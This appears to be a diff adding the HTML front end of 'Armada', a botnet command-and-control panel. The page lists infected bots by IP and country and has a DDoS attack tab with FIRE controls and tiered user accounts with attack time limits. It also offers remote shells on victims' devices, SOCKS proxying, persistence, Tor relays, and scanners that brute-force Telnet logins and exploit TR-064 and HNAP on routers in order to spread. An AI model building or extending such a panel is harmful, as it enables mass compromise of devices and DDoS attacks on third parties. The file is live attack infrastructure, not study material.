@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Armada</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <div class="brand">&#9790;&#8483;&#9790; Armada <span class="sse-indicator sse-disconnected" id="sse-dot"
+                title="Connecting..."></span></div>
+        <div class="nav">
+            <button class="theme-toggle" onclick="toggleTheme()" id="theme-toggle" title="Toggle theme">
+                <svg class="theme-icon sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="5" />
+                    <line x1="12" y1="1" x2="12" y2="3" />
+                    <line x1="12" y1="21" x2="12" y2="23" />
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64" />
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78" />
+                    <line x1="1" y1="12" x2="3" y2="12" />
+                    <line x1="21" y1="12" x2="23" y2="12" />
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36" />
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22" />
+                </svg>
+                <svg class="theme-icon moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
+                </svg>
+            </button>
+            <button class="help-btn" onclick="toggleHelp()" title="Keyboard shortcuts (?)">?</button>
+            <button class="notif-toggle" onclick="toggleNotifs()" id="notif-btn">Notifications <span class="notif-badge"
+                    id="notif-badge" style="display:none">0</span></button>
+            <a href="/logout">Logout</a>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <div class="label">Bots Online <span class="stat-delta flat" id="s-bots-delta"></span></div>
+            <div class="value green" id="s-bots">-</div>
+            <svg class="sparkline spark-green" id="spark-bots" viewBox="0 0 120 32" preserveAspectRatio="none"></svg>
+            <div class="stat-sub" id="s-bots-range"></div>
+        </div>
+        <div class="stat-card">
+            <div class="label">Total RAM <span class="stat-delta flat" id="s-ram-delta"></span></div>
+            <div class="value" id="s-ram">-</div>
+            <svg class="sparkline spark-blue" id="spark-ram" viewBox="0 0 120 32" preserveAspectRatio="none"></svg>
+        </div>
+        <div class="stat-card">
+            <div class="label">Total CPU <span class="stat-delta flat" id="s-cpu-delta"></span></div>
+            <div class="value" id="s-cpu">-</div>
+            <svg class="sparkline spark-purple" id="spark-cpu" viewBox="0 0 120 32" preserveAspectRatio="none"></svg>
+        </div>
+        <div class="stat-card">
+            <div class="label">C2 Uptime</div>
+            <div class="value purple" id="s-uptime">-</div>
+            <div class="stat-sub">session active</div>
+        </div>
+        <div class="stat-card">
+            <div class="label">Architectures</div>
+            <div class="arch-pills" id="s-arch"></div>
+        </div>
+        <div class="stat-card" id="s-groups-card" style="display:none">
+            <div class="label">Groups</div>
+            <div class="arch-pills" id="s-groups"></div>
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Command Center — collapsible panel -->
+        <div class="cmd-bar" id="cmd-bar">
+            <button class="cmd-toggle" onclick="toggleCmdBar()" title="Toggle command center">CMD</button>
+            <div class="cmd-inline" id="cmd-inline">
+                <div class="cmd-cat-btns" id="cmd-cat-btns">
+                    <button class="cmd-cat active" data-cat="exec" onclick="switchCmdCat(this)">Exec</button>
+                    <button class="cmd-cat" data-cat="network" onclick="switchCmdCat(this)">Network</button>
+                    <button class="cmd-cat" data-cat="scanner" onclick="switchCmdCat(this)">Scanners</button>
+                    <button class="cmd-cat" data-cat="mgmt" onclick="switchCmdCat(this)">Mgmt</button>
+                </div>
+                <select id="cmd-type" onchange="updateArgFields()">
+                    <option value="!shell" data-cat="exec">!shell</option>
+                    <option value="!detach" data-cat="exec">!detach</option>
+                    <option value="!socks" data-cat="network">!socks</option>
+                    <option value="!stopsocks" data-cat="network">!stopsocks</option>
+                    <option value="!socksauth" data-cat="network">!socksauth</option>
+                    <option value="!scan" data-cat="scanner">!scan</option>
+                    <option value="!stopscan" data-cat="scanner">!stopscan</option>
+                    <option value="!tr064" data-cat="scanner">!tr064</option>
+                    <option value="!stoptr064" data-cat="scanner">!stoptr064</option>
+                    <option value="!hnap" data-cat="scanner">!hnap</option>
+                    <option value="!stophnap" data-cat="scanner">!stophnap</option>
+                    <option value="!info" data-cat="mgmt">!info</option>
+                    <option value="!persist" data-cat="mgmt">!persist</option>
+                    <option value="!reinstall" data-cat="mgmt">!reinstall</option>
+                    <option value="!lolnogtfo" data-cat="mgmt">!kill</option>
+                </select>
+                <div id="arg-fields" class="cmd-args"></div>
+                <div class="cmd-target-wrap">
+                    <input type="text" id="cmd-bot" placeholder="all bots" class="cmd-target" autocomplete="off">
+                    <button class="cmd-target-clear" id="cmd-target-clear" onclick="clearCmdTarget()"
+                        title="Clear target" style="display:none">&times;</button>
+                </div>
+                <button class="cmd-btn" onclick="sendCmd()">Send</button>
+            </div>
+        </div>
+
+        <!-- Tab bar -->
+        <div class="tab-bar">
+            <button class="tab active" data-tab="tab-bots" onclick="switchTab(this)">Bots <span class="tab-count"
+                    id="tab-bots-count">0</span></button>
+            <button class="tab" data-tab="tab-socks" onclick="switchTab(this)">SOCKS <span class="tab-count"
+                    id="tab-socks-count">0</span></button>
+            <button class="tab" data-tab="tab-attack" onclick="switchTab(this)">Attack</button>
+            <button class="tab" data-tab="tab-activity" onclick="switchTab(this)">Activity</button>
+            <button class="tab" data-tab="tab-relays" onclick="switchTab(this);loadRelays();loadRelayAPIStatus()">Relays
+                <span class="tab-count" id="tab-relays-count">0</span></button>
+            <button class="tab" data-tab="tab-tasks" onclick="switchTab(this);loadTasks()">Tasks <span class="tab-count"
+                    id="tab-tasks-count">0</span></button>
+            <button class="tab" data-tab="tab-users" onclick="switchTab(this);loadUsers()">Users</button>
+            <button class="tab" data-tab="tab-scanners" onclick="switchTab(this)">Scanners</button>
+        </div>
+
+        <!-- Tab: Bots -->
+        <div class="tab-panel active" id="tab-bots">
+            <div class="search-bar">
+                <input type="text" id="bot-search"
+                    placeholder="Filter bots by ID, IP, country, arch... (press / to focus)" oninput="filterBotTable()"
+                    autocomplete="off" spellcheck="false">
+                <span class="search-count" id="search-count"></span>
+                <button class="compact-toggle" onclick="refreshAll()" title="Refresh bots &amp; stats">&#8635;</button>
+                <button class="compact-toggle" id="compact-toggle" onclick="toggleCompactMode()"
+                    title="Toggle compact mode">Compact</button>
+            </div>
+            <!-- Filter panel -->
+            <div class="filter-panel" id="filter-panel">
+                <div class="filter-header">
+                    <span class="filter-title">Filters</span>
+                    <button class="filter-clear-btn" onclick="clearAllFilters()">Clear All</button>
+                </div>
+                <div class="filter-groups" id="filter-groups"></div>
+            </div>
+            <!-- Multi-select action bar -->
+            <div class="multi-select-bar" id="multi-select-bar" style="display:none">
+                <div class="ms-info"><input type="checkbox" id="ms-select-all"
+                        onchange="toggleSelectAll(this.checked)"><span id="ms-count">0 selected</span></div>
+                <div class="ms-actions">
+                    <button class="ms-btn ms-btn-group" onclick="msSetGroup()">Set Group</button>
+                    <button class="ms-btn" onclick="msOpenShells()">Open Shells</button>
+                    <button class="ms-btn" onclick="msCmd('!socks')">Start SOCKS</button>
+                    <button class="ms-btn" onclick="msCmd('!persist')">Persist</button>
+                    <button class="ms-btn" onclick="msScan()">Start Scan</button>
+                    <button class="ms-btn" onclick="msCmd('!stopscan')">Stop Scan</button>
+                    <button class="ms-btn" onclick="msCmd('!tr064')">TR-064</button>
+                    <button class="ms-btn" onclick="msCmd('!stoptr064')">Stop TR-064</button>
+                    <button class="ms-btn" onclick="msCmd('!hnap')">HNAP</button>
+                    <button class="ms-btn" onclick="msCmd('!stophnap')">Stop HNAP</button>
+                    <button class="ms-btn" onclick="msCmd('!info')">Info</button>
+                    <button class="ms-btn ms-btn-danger" onclick="msKill()">Kill</button>
+                </div>
+            </div>
+            <div id="bot-table-wrap" class="bot-table-virtual">
+                <table>
+                    <thead>
+                        <tr>
+                            <th style="width:32px"><input type="checkbox" id="th-select-all"
+                                    onchange="toggleSelectAll(this.checked)"></th>
+                            <th class="sortable" onclick="sortBots('botID')">Bot ID <span class="sort-arrow"
+                                    id="sort-botID"></span></th>
+                            <th class="sortable" onclick="sortBots('ip')">IP <span class="sort-arrow"
+                                    id="sort-ip"></span></th>
+                            <th class="sortable" onclick="sortBots('country')">Country <span class="sort-arrow"
+                                    id="sort-country"></span></th>
+                            <th class="sortable" onclick="sortBots('group')">Group <span class="sort-arrow"
+                                    id="sort-group"></span></th>
+                            <th class="sortable" onclick="sortBots('arch')">Arch <span class="sort-arrow"
+                                    id="sort-arch"></span></th>
+                            <th class="sortable" onclick="sortBots('ram')">RAM <span class="sort-arrow"
+                                    id="sort-ram"></span></th>
+                            <th class="sortable" onclick="sortBots('cpuCores')">CPU <span class="sort-arrow"
+                                    id="sort-cpuCores"></span></th>
+                            <th class="sortable" onclick="sortBots('processName')">Process <span class="sort-arrow"
+                                    id="sort-processName"></span></th>
+                            <th class="sortable" onclick="sortBots('socksActive')">SOCKS <span class="sort-arrow"
+                                    id="sort-socksActive"></span></th>
+                            <th>Uptime</th>
+                            <th>Last Ping</th>
+                        </tr>
+                    </thead>
+                    <tbody id="bot-tbody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Tab: SOCKS -->
+        <div class="tab-panel" id="tab-socks">
+            <div class="socks-stat">
+                <div>
+                    <div class="ss-label">Active</div>
+                    <div class="ss-val" id="socks-active">0</div>
+                </div>
+                <div>
+                    <div class="ss-label">Total Bots</div>
+                    <div class="ss-val" style="color:var(--blue)" id="socks-total">0</div>
+                </div>
+            </div>
+            <!-- Relay Health Panel -->
+            <div id="socks-relay-health" style="margin-bottom:16px"></div>
+            <div id="socks-dash-wrap">
+                <div class="no-bots">No active SOCKS proxies</div>
+            </div>
+        </div>
+
+        <!-- Tab: Attack -->
+        <div class="tab-panel" id="tab-attack">
+            <div class="atk-panel">
+                <div class="atk-row">
+                    <div class="atk-group" title="Attack method/vector to use">
+                        <label>Method</label>
+                        <select id="atk-method" onchange="updateAtkMethodInfo()">
+                            <optgroup label="UDP" id="atk-udp-group"></optgroup>
+                            <optgroup label="TCP" id="atk-tcp-group"></optgroup>
+                            <optgroup label="Layer 3" id="atk-l3-group"></optgroup>
+                        </select>
+                    </div>
+                    <div class="atk-group" title="Target IP address or CIDR subnet (e.g. 1.2.3.0/24)">
+                        <label>Target IP</label>
+                        <input type="text" id="atk-target" placeholder="1.2.3.4" autocomplete="off" spellcheck="false">
+                    </div>
+                    <div class="atk-group" title="Destination port on the target (default: 80)">
+                        <label>Port</label>
+                        <input type="text" id="atk-port" placeholder="80" style="width:80px" autocomplete="off">
+                    </div>
+                    <div class="atk-group"
+                        title="Attack duration in seconds (default: 30). Limited by your account's max time">
+                        <label>Duration (s)</label>
+                        <input type="text" id="atk-duration" placeholder="30" style="width:80px" autocomplete="off">
+                    </div>
+                    <div class="atk-group" title="Target a specific bot by ID, or leave empty to send to all bots">
+                        <label>Bot Target</label>
+                        <input type="text" id="atk-bot" placeholder="empty = all bots" autocomplete="off">
+                    </div>
+                    <button class="atk-fire-btn" onclick="fireAttack()" title="Launch the attack">FIRE</button>
+                    <button class="atk-stop-btn" onclick="stopAttack()" title="Stop all running attacks">STOP
+                        ALL</button>
+                </div>
+                <div class="atk-desc" id="atk-desc"></div>
+                <div class="atk-advanced-toggle" onclick="toggleAtkAdvanced()">Advanced Options</div>
+                <div class="atk-advanced" id="atk-advanced" style="display:none">
+                    <div class="atk-opts" id="atk-opts"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab: Activity -->
+        <div class="tab-panel" id="tab-activity">
+            <div class="activity-controls">
+                <input type="text" id="activity-search" placeholder="Search activity..." oninput="filterActivity()"
+                    autocomplete="off" spellcheck="false" class="activity-search-input">
+                <div class="activity-filters" id="activity-filters">
+                    <label class="activity-filter-chip active" data-type="all"
+                        onclick="toggleActivityFilter(this)">All</label>
+                    <label class="activity-filter-chip" data-type="connect" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--green)"></span>Connect</label>
+                    <label class="activity-filter-chip" data-type="disconnect"
+                        onclick="toggleActivityFilter(this)"><span class="afc-dot"
+                            style="background:var(--red)"></span>Disconnect</label>
+                    <label class="activity-filter-chip" data-type="command" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--blue)"></span>Command</label>
+                    <label class="activity-filter-chip" data-type="socks" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--accent)"></span>SOCKS</label>
+                    <label class="activity-filter-chip" data-type="error" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--yellow)"></span>Error</label>
+                </div>
+                <div class="activity-meta">
+                    <span class="activity-count" id="activity-count"></span>
+                    <button class="activity-clear-btn" onclick="clearActivity()">Clear</button>
+                </div>
+            </div>
+            <div class="activity-list" id="activity-list">
+                <div class="no-bots">No activity yet</div>
+            </div>
+        </div>
+
+        <!-- Tab: Relays -->
+        <div class="tab-panel" id="tab-relays">
+            <div class="users-toolbar" style="margin-bottom:12px">
+                <span style="color:var(--text-dim);font-size:13px">Manage backconnect relay servers. Bots connect OUT to
+                    relays — no open ports on bots.</span>
+            </div>
+
+            <!-- Relay API Phone-Home Controls -->
+            <div class="users-form-wrap" style="display:block;margin-bottom:16px">
+                <div class="users-form">
+                    <h3>Relay Phone-Home API <span
+                            style="font-size:11px;color:var(--text-dim);font-weight:normal">(clearnet — Tor relay
+                            reports always accepted)</span></h3>
+                    <div class="uf-row">
+                        <label>Status</label>
+                        <span id="relay-api-status"
+                            style="font-family:monospace;color:var(--text-dim)">Loading...</span>
+                    </div>
+                    <div class="uf-row">
+                        <label>Port</label>
+                        <input type="text" id="relay-api-port" placeholder="8443" autocomplete="off"
+                            style="width:100px">
+                    </div>
+                    <div class="uf-actions">
+                        <button class="uf-save" id="relay-api-toggle-btn" onclick="toggleRelayAPI()">Start</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live Relay Stats -->
+            <div id="relay-stats-wrap" style="margin-bottom:16px"></div>
+
+            <div class="users-form-wrap" style="display:block;margin-bottom:16px">
+                <div class="users-form">
+                    <h3>Add Relay</h3>
+                    <div class="uf-row">
+                        <label>Name</label>
+                        <input type="text" id="relay-name" placeholder="e.g. US-East-1" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>Host</label>
+                        <input type="text" id="relay-host" placeholder="IP or hostname" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>Control Port</label>
+                        <input type="text" id="relay-cp" placeholder="9001" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>SOCKS Port</label>
+                        <input type="text" id="relay-sp" placeholder="1080" autocomplete="off">
+                    </div>
+                    <div class="uf-actions">
+                        <button class="uf-save" onclick="addRelay()">Add Relay</button>
+                    </div>
+                </div>
+            </div>
+            <div id="relay-table-wrap">
+                <div class="no-bots">No relays configured</div>
+            </div>
+        </div>
+
+        <!-- Tab: Tasks -->
+        <div class="tab-panel" id="tab-tasks">
+            <div class="users-toolbar" style="margin-bottom:12px">
+                <span style="color:var(--text-dim);font-size:13px">Persistent commands that auto-execute on every bot
+                    join. Use run-once to prevent re-execution on reconnecting bots.</span>
+            </div>
+            <div class="cmd-bar" id="task-bar">
+                <span class="cmd-toggle" style="cursor:default" title="New task">TASK</span>
+                <div class="cmd-inline">
+                    <select id="task-type" onchange="updateTaskArgFields()">
+                        <option value="!shell">!shell</option>
+                        <option value="!detach">!detach</option>
+                        <option value="!socks">!socks</option>
+                        <option value="!stopsocks">!stopsocks</option>
+                        <option value="!socksauth">!socksauth</option>
+                        <option value="!info">!info</option>
+                        <option value="!persist">!persist</option>
+                        <option value="!scan">!scan</option>
+                        <option value="!stopscan">!stopscan</option>
+                        <option value="!tr064">!tr064</option>
+                        <option value="!stoptr064">!stoptr064</option>
+                        <option value="!hnap">!hnap</option>
+                        <option value="!stophnap">!stophnap</option>
+                        <option value="!lolnogtfo">!kill</option>
+                    </select>
+                    <div id="task-arg-fields" class="cmd-args"></div>
+                    <input type="number" id="task-duration" value="0" min="0" placeholder="TTL sec (0=∞)"
+                        class="cmd-target" style="width:100px" title="Expires in seconds (0=never)">
+                    <label class="task-runonce-label" title="Run only once per bot (skip reconnecting bots)">
+                        <input type="checkbox" id="task-runonce">
+                        <span>Once</span>
+                    </label>
+                    <button class="cmd-btn" onclick="addTask()">Add</button>
+                </div>
+            </div>
+            <div id="task-table-wrap" style="margin-top:12px">
+                <div class="no-bots">No active tasks</div>
+            </div>
+        </div>
+
+        <!-- Tab: Users -->
+        <div class="tab-panel" id="tab-users">
+            <div class="users-toolbar">
+                <button class="users-add-btn" onclick="showAddUserForm()">+ Add User</button>
+            </div>
+            <div class="users-form-wrap" id="users-form-wrap" style="display:none">
+                <div class="users-form">
+                    <h3 id="user-form-title">Add User</h3>
+                    <input type="hidden" id="uf-editing">
+                    <div class="uf-row">
+                        <label>Username</label>
+                        <input type="text" id="uf-username" placeholder="username" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>Password</label>
+                        <input type="text" id="uf-password" placeholder="password" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>Level</label>
+                        <select id="uf-level">
+                            <option value="Owner">Owner</option>
+                            <option value="Admin">Admin</option>
+                            <option value="Pro">Pro</option>
+                            <option value="Basic" selected>Basic</option>
+                        </select>
+                    </div>
+                    <div class="uf-row">
+                        <label>Expires</label>
+                        <input type="date" id="uf-expire">
+                    </div>
+                    <div class="uf-row">
+                        <label>Max Time (s)</label>
+                        <input type="number" id="uf-maxtime" value="300" min="1">
+                    </div>
+                    <div class="uf-row">
+                        <label>Concurrents</label>
+                        <input type="number" id="uf-concurrents" value="1" min="1">
+                    </div>
+                    <div class="uf-row">
+                        <label>Max Bots (0=all)</label>
+                        <input type="number" id="uf-maxbots" value="0" min="0">
+                    </div>
+                    <div class="uf-row">
+                        <label>Methods (comma-separated)</label>
+                        <input type="text" id="uf-methods" placeholder="udpplain,syn,ack" autocomplete="off">
+                    </div>
+                    <div class="uf-actions">
+                        <button class="uf-save" onclick="saveUser()">Save</button>
+                        <button class="uf-cancel" onclick="hideUserForm()">Cancel</button>
+                    </div>
+                </div>
+            </div>
+            <div class="users-grid" id="users-grid">
+                <div class="no-bots">Loading users...</div>
+            </div>
+        </div>
+
+        <!-- Tab: Scanners -->
+        <div class="tab-panel" id="tab-scanners">
+            <div class="users-toolbar" style="margin-bottom:12px">
+                <span style="color:var(--text-dim);font-size:13px">Start or stop scanners across all bots. Telnet
+                    scanner requires a scan server address.</span>
+            </div>
+            <div class="scanner-grid">
+                <!-- Telnet Scanner -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">Telnet Scanner</span>
+                        <span class="scanner-card-desc">Brute-force Telnet credentials and spread to new devices</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="cmd-group" style="margin-bottom:10px">
+                            <label>Scan Server</label>
+                            <input type="text" id="scan-telnet-addr" placeholder="host:port (e.g. 1.2.3.4:48290)"
+                                class="cmd-target" style="width:100%">
+                        </div>
+                        <div class="scanner-card-actions">
+                            <button class="ms-btn" onclick="scannerStart('telnet')">Start All</button>
+                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('telnet')">Stop All</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- TR-064 Scanner -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">TR-064 Scanner</span>
+                        <span class="scanner-card-desc">Exploit TR-064 (CPE WAN Management) on vulnerable routers</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="scanner-card-actions">
+                            <button class="ms-btn" onclick="scannerStart('tr064')">Start All</button>
+                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('tr064')">Stop All</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- HNAP Scanner -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">HNAP Scanner</span>
+                        <span class="scanner-card-desc">Exploit HNAP (Home Network Administration Protocol) on
+                            vulnerable routers</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="scanner-card-actions">
+                            <button class="ms-btn" onclick="scannerStart('hnap')">Start All</button>
+                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('hnap')">Stop All</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Notification drawer -->
+    <div class="notif-drawer" id="notif-drawer">
+        <div class="notif-header">
+            <h3>Notifications</h3>
+            <button class="notif-close" onclick="toggleNotifs()">&times;</button>
+        </div>
+        <div class="notif-list" id="notif-list">
+            <div class="notif-empty">No notifications yet</div>
+        </div>
+    </div>
+
+    <!-- Bot info popup -->
+    <div class="bot-info-popup" id="bot-popup">
+        <button class="popup-close" onclick="closeBotPopup()">&times;</button>
+        <div class="popup-header">
+            <span class="popup-id" id="popup-botid"></span>
+            <span class="popup-country" id="popup-country"></span>
+        </div>
+        <div class="popup-body">
+            <div class="popup-row"><span class="popup-label">IP Address</span><span class="popup-val"
+                    id="popup-ip"></span></div>
+            <div class="popup-row"><span class="popup-label">Architecture</span><span class="popup-val"
+                    id="popup-arch"></span></div>
+            <div class="popup-row"><span class="popup-label">RAM</span><span class="popup-val" id="popup-ram"></span>
+            </div>
+            <div class="popup-row"><span class="popup-label">CPU Cores</span><span class="popup-val"
+                    id="popup-cpu"></span></div>
+            <div class="popup-row"><span class="popup-label">Process</span><span class="popup-val"
+                    id="popup-proc"></span></div>
+            <div class="popup-row"><span class="popup-label">Uptime</span><span class="popup-val"
+                    id="popup-uptime"></span></div>
+            <div class="popup-row"><span class="popup-label">Last Ping</span><span class="popup-val"
+                    id="popup-ping"></span></div>
+            <div class="popup-section">
+                <div class="popup-section-title">SOCKS Proxy</div>
+                <div class="popup-row"><span class="popup-label">Status</span><span class="popup-val"
+                        id="popup-socks-status"></span></div>
+                <div class="popup-row" id="popup-socks-relay-row" style="display:none"><span
+                        class="popup-label">Port</span><span class="popup-val" id="popup-socks-relay"></span></div>
+                <div class="popup-row" id="popup-socks-auth-row" style="display:none"><span class="popup-label">Auth
+                        User</span><span class="popup-val" id="popup-socks-user"></span></div>
+                <div class="popup-row" id="popup-socks-since-row" style="display:none"><span class="popup-label">Running
+                        Since</span><span class="popup-val" id="popup-socks-since"></span></div>
+            </div>
+        </div>
+        <div class="popup-actions" id="popup-actions"></div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- Shell modal (enhanced with sidebar + file browser) -->
+    <div class="shell-overlay" id="shell-overlay" onclick="if(event.target===this)closeShell()">
+        <div class="shell-modal">
+            <div class="shell-header">
+                <div style="display:flex;flex-direction:column;gap:4px">
+                    <span class="title" id="shell-title">Shell</span>
+                    <div class="meta" id="shell-meta"></div>
+                </div>
+                <div style="display:flex;gap:6px;align-items:center">
+                    <!-- Shell tab bar for multi-shell -->
+                    <div class="shell-tabs" id="shell-tabs"></div>
+                    <button class="close-btn" onclick="closeShell()">&times;</button>
+                </div>
+            </div>
+            <!-- Navigation bar: breadcrumb + quick nav -->
+            <div class="shell-nav">
+                <div class="shell-breadcrumb" id="shell-breadcrumb"></div>
+                <div class="shell-quicknav">
+                    <button class="qnav-btn" onclick="shellCd('/')" title="Root">/</button>
+                    <button class="qnav-btn" onclick="shellCd('~')" title="Home">~</button>
+                    <button class="qnav-btn" onclick="shellCd('..')" title="Parent">..</button>
+                    <button class="qnav-btn" onclick="shellCd('/tmp')" title="Temp">/tmp</button>
+                </div>
+            </div>
+            <div class="shell-body">
+                <!-- File browser sidebar -->
+                <div class="shell-sidebar" id="shell-sidebar">
+                    <div class="sidebar-header">
+                        <span>Files</span>
+                        <button class="sidebar-refresh" onclick="refreshFiles()" title="Refresh">&#8635;</button>
+                    </div>
+                    <div class="file-list" id="file-list">
+                        <div class="file-empty">Send a command to populate</div>
+                    </div>
+                </div>
+                <!-- Terminal area -->
+                <div class="shell-terminal">
+                    <div class="shell-output" id="shell-output"></div>
+                    <div class="shell-input-row">
+                        <span class="prompt" id="shell-prompt">~$</span>
+                        <input type="text" id="shell-input" placeholder="Type a command... (Tab for autocomplete)"
+                            autocomplete="off" spellcheck="false">
+                        <!-- Tab completion popup -->
+                        <div class="tab-complete" id="tab-complete" style="display:none"></div>
+                    </div>
+                </div>
+                <!-- Bot info sidebar -->
+                <div class="shell-info-sidebar" id="shell-info-sidebar">
+                    <div class="sidebar-header"><span>Bot Info</span></div>
+                    <div class="info-sidebar-body" id="info-sidebar-body"></div>
+                </div>
+            </div>
+            <div class="shell-actions">
+                <button class="shell-action-btn" onclick="saveShellHistory()"
+                    title="Download shell history">Save</button>
+                <button class="shell-action-btn" onclick="copyShellOutput()" title="Copy output to clipboard">Copy
+                    Output</button>
+                <button class="shell-action-btn" onclick="shellNetScan()" title="Quick network recon from bot">Net
+                    Scan</button>
+                <button class="shell-action-btn" style="color:var(--accent);border-color:var(--accent)"
+                    onclick="shellStartSocks()" title="Start SOCKS proxy">SOCKS</button>
+                <button class="shell-action-btn shell-action-danger" onclick="clearShellHistory()"
+                    title="Clear output">Clear</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Keyboard shortcuts help -->
+    <div class="help-overlay" id="help-overlay" onclick="if(event.target===this)toggleHelp()">
+        <div class="help-modal">
+            <div class="help-header">
+                <span class="help-title">Keyboard Shortcuts</span>
+                <button class="help-close" onclick="toggleHelp()">&times;</button>
+            </div>
+            <div class="help-body">
+                <div class="help-section">
+                    <div class="help-section-title">Navigation</div>
+                    <div class="help-row"><kbd>1</kbd><span>Bots tab</span></div>
+                    <div class="help-row"><kbd>2</kbd><span>SOCKS tab</span></div>
+                    <div class="help-row"><kbd>3</kbd><span>Attack tab</span></div>
+                    <div class="help-row"><kbd>4</kbd><span>Activity tab</span></div>
+                    <div class="help-row"><kbd>5</kbd><span>Relays tab</span></div>
+                    <div class="help-row"><kbd>6</kbd><span>Tasks tab</span></div>
+                    <div class="help-row"><kbd>7</kbd><span>Users tab</span></div>
+                    <div class="help-row"><kbd>/</kbd> or <kbd>s</kbd><span>Focus search</span></div>
+                    <div class="help-row"><kbd>?</kbd><span>Toggle this help</span></div>
+                </div>
+                <div class="help-section">
+                    <div class="help-section-title">Bot Table</div>
+                    <div class="help-row"><span class="help-action">Right-click row</span><span>Bot info popup</span>
+                    </div>
+                    <div class="help-row"><span class="help-action">Double-click row</span><span>Open shell</span></div>
+                    <div class="help-row"><span class="help-action">Click column header</span><span>Sort by
+                            column</span></div>
+                    <div class="help-row"><span class="help-action">Checkbox + toolbar</span><span>Bulk
+                            operations</span></div>
+                </div>
+                <div class="help-section">
+                    <div class="help-section-title">Shell</div>
+                    <div class="help-row"><kbd>Tab</kbd><span>Autocomplete ! commands</span></div>
+                    <div class="help-row"><kbd>&uarr;</kbd> / <kbd>&darr;</kbd><span>Command history</span></div>
+                    <div class="help-row"><kbd>Escape</kbd><span>Close shell</span></div>
+                </div>
+                <div class="help-section">
+                    <div class="help-section-title">General</div>
+                    <div class="help-row"><kbd>Escape</kbd><span>Close any modal or overlay</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/app.js"></script>
+</body>
+
+</html>
